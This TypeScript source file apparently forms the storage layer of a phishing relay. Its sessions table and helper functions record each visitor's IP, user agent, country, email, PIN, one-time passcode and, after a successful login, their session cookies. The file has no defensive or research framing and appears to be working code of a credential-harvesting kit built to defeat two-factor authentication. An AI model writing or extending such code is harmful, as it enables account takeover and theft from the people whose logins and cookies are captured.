import initSqlJs, { type Database } from 'sql.js';
import { readFileSync, writeFileSync, existsSync } from 'fs';

const DB_PATH = process.env.DB_PATH ?? 'relay.db';

let db: Database;

export async function initDb() {
  const SQL = await initSqlJs();
  if (existsSync(DB_PATH)) {
    db = new SQL.Database(readFileSync(DB_PATH));
  } else {
    db = new SQL.Database();
  }

  db.run(`
    CREATE TABLE IF NOT EXISTS sessions (
      id TEXT PRIMARY KEY, created INTEGER, ip TEXT, ua TEXT, cc TEXT,
      mode TEXT, step TEXT, email TEXT, pin TEXT, otp TEXT,
      authed INTEGER DEFAULT 0, cookies TEXT, note TEXT
    );
    CREATE TABLE IF NOT EXISTS events (
      id INTEGER PRIMARY KEY AUTOINCREMENT, sid TEXT, ts INTEGER, kind TEXT, detail TEXT
    );
  `);
  persist();
}

function persist() {
  try { writeFileSync(DB_PATH, Buffer.from(db.export())); } catch {}
}

function run(sql: string, ...params: any[]) {
  db.run(sql, params);
  persist();
}

function get(sql: string, ...params: any[]): Record<string, any> | undefined {
  const stmt = db.prepare(sql);
  stmt.bind(params);
  if (stmt.step()) {
    const row = stmt.getAsObject();
    stmt.free();
    return row;
  }
  stmt.free();
  return undefined;
}

function all(sql: string, ...params: any[]): Record<string, any>[] {
  const stmt = db.prepare(sql);
  stmt.bind(params);
  const rows: Record<string, any>[] = [];
  while (stmt.step()) rows.push(stmt.getAsObject());
  stmt.free();
  return rows;
}

export const q = {
  newSession: (id: string, created: number, ip: string, ua: string, cc: string, mode: string, step: string) =>
    run(`INSERT INTO sessions (id,created,ip,ua,cc,mode,step) VALUES (?,?,?,?,?,?,?)`, id, created, ip, ua, cc, mode, step),
  setStep: (step: string, id: string) =>
    run(`UPDATE sessions SET step=? WHERE id=?`, step, id),
  setCred: (email: string|null, pin: string|null, otp: string|null, id: string) =>
    run(`UPDATE sessions SET email=COALESCE(?,email), pin=COALESCE(?,pin), otp=COALESCE(?,otp) WHERE id=?`, email, pin, otp, id),
  setAuthed: (cookies: string, id: string) =>
    run(`UPDATE sessions SET authed=1, cookies=?, step='done' WHERE id=?`, cookies, id),
  setNote: (note: string, id: string) =>
    run(`UPDATE sessions SET note=? WHERE id=?`, note, id),
  get: (id: string) =>
    get(`SELECT * FROM sessions WHERE id=?`, id),
  all: () =>
    all(`SELECT * FROM sessions ORDER BY created DESC LIMIT 200`),
  ev: (sid: string, ts: number, kind: string, detail: string) =>
    run(`INSERT INTO events (sid,ts,kind,detail) VALUES (?,?,?,?)`, sid, ts, kind, detail),
  purge: (before: number) =>
    run(`DELETE FROM sessions WHERE created < ?`, before),
};
